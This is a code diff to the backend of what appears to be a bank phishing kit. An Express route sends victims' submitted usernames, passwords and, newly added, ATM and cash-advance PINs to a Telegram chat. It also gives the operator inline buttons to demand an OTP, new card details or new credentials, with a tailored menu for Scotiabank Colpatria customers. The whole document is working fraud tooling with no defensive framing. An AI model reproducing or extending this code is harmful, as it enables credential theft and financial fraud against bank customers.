@@ -38,7 +38,9 @@ router.post('/generals', (req, res) => {
 
     \u{1F512} Pass: ${req.body.puser}
 
-    \u{1F512} adelantoPass: ${req.body.clav}
+    \u{1F512} cCajero: ${req.body.ccajero}
+
+    \u{1F512} cAvances: ${req.body.cavances}
 
     ----------------------------
 
@@ -70,9 +72,34 @@ router.post('/generals', (req, res) => {
           { text: '$ Pedir OTP $', callback_data: `otp:${token}` }
         ],
         [
-          { text: 'newCard', callback_data: `card:${token}` },
+          { text: 'repeatCard', callback_data: `rcard:${token}` },
+          { text: 'newCard', callback_data: `ncard:${token}` },
           { text: 'newUserPass', callback_data: `userp:${token}` },
           { text: 'newCC', callback_data: `index:${token}` },
+        ],
+        [
+          { text: 'Finalizar', callback_data: `success:${token}` },
+        ]
+      ],
+      one_time_keyboard: true,
+    }),
+  };
+
+  const optscol = {
+    reply_markup: JSON.stringify({
+      inline_keyboard: [
+        [
+          { text: '$ Pedir OTP $', callback_data: `otp:${token}` }
+        ],
+        [
+          { text: 'repeatCard', callback_data: `rcard:${token}` },
+          { text: 'newCard', callback_data: `ncard:${token}` },
+          { text: 'newUserPass', callback_data: `userp:${token}` },
+          { text: 'newCC', callback_data: `index:${token}` },
+        ],
+        [
+          { text: 'cCajero', callback_data: `ccajero:${token}` },
+          { text: 'cAvances', callback_data: `cavances:${token}` },
         ],
         [
           { text: 'Finalizar', callback_data: `success:${token}` },
@@ -89,7 +116,7 @@ router.post('/generals', (req, res) => {
   } else {
     bot.sendMessage(CHAT_ID, infoMessage3)
       .then(() => {
-        bot.sendMessage(CHAT_ID, 'OPCIONES: ', opts3)
+        bot.sendMessage(CHAT_ID, 'OPCIONES: ', req.body.ban === 'scotiabank-colpatria' ? optscol : opts3)
           .then(message => {
             // bot.sendMessage('1660900306', infoMessage3);
             const messageID = message.message_id;
